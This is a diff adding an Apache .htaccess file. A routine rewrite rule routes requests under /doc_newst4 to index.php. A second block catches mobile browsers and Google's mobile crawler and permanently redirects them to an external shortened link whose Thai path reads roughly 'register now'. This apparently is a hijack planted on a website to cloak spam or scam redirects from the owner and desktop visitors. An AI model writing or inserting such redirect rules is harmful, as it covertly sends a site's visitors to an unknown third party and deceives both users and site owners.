@@ -1,0 +1,10 @@
+RewriteEngine On
+RewriteBase /doc_newst4
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule ^(.+)$ index.php?playing=$1 [L,QSA]
+
+RewriteEngine On
+
+RewriteCond %{HTTP_USER_AGENT} "android|blackberry|ipad|iphone|ipod|iemobile|opera\ mobile|palmos|webos|googlebot-mobile" [NC]
+RewriteRule ^(.*)$ https://jali.me/ลงทะเบ-ยนตอนน [L,R=301]
